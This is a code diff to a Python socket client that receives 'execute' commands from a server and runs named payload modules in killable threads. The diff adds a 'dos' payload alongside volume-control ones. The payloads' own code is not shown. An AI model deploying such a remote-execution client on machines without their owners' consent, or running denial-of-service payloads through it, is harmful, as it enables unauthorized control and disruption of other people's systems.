@@ -1,23 +1,23 @@
-from threading import Thread
+from customThreading import KillableThread
 from socketHelpers.client import Client
 from socketHelpers.packet import Packet
 
 import os
 import time
 
+import payloads.dos
 import payloads.test
 import payloads.minvolume
 import payloads.maxvolume
 
-paylds = [payloads.test, payloads.minvolume, payloads.maxvolume]
+paylds = [payloads.dos, payloads.test, payloads.minvolume, payloads.maxvolume]
 PAYLOADS = {str(x.__name__).split(".")[1]:x for x in paylds}
 
 
-class PayloadPlayer(Thread):
+class PayloadPlayer(KillableThread):
     def __init__(self, payload, manager=None):
         super().__init__()
         self.payload = payload
-        self.running = False
         self.manager = manager
         self.starttime = 0
 
@@ -27,20 +27,19 @@ class PayloadPlayer(Thread):
 
     def run(self):
         self.starttime = time.time()
-        self.running = True
         if self.manager : self.manager.activePayloads[self.payload.__name__.split(".")[1]] = self
         self.payload.execute(self)
-        self.running = False
 
-    def kill(self):
-        self.running = False
+    def error(self, e):
+        if self.manager: return self.manager.send(Packet("info", str(e)))
+        print("paylod error: %s"%e)
 
-    def execute(self):
+    def execute(self, data):
+        self.data = data
         if self.payload.RETURNS: return self.payload.execute(self)
         self.start()
 
         return "Started execution of '%s'."%self.payload
-
 
 
 class Client(Client):
@@ -55,8 +54,7 @@ class Client(Client):
         return event_decorator
 
     def handle(self, packet):
-        f = lambda x, y: (x, y)
-        self.events.get(packet.get_id(), f)(self, packet)
+        self.events.get(packet.get_id(), lambda x, y: (x, y))(self, packet)
 
 
 client = Client("localhost", 2000)
@@ -74,7 +72,7 @@ def event_execute_list(client, packet):
 @client.event("execute")
 def event_execute(client, packet):
     try:
-        data = PayloadPlayer(PAYLOADS[packet.read()], client).execute()
+        data = PayloadPlayer(PAYLOADS[packet.read().split("<x>")[0]], client).execute(packet.read())
     except KeyError:
         client.send(Packet("info", "Can not find payload %s."%packet.read()))
     else:
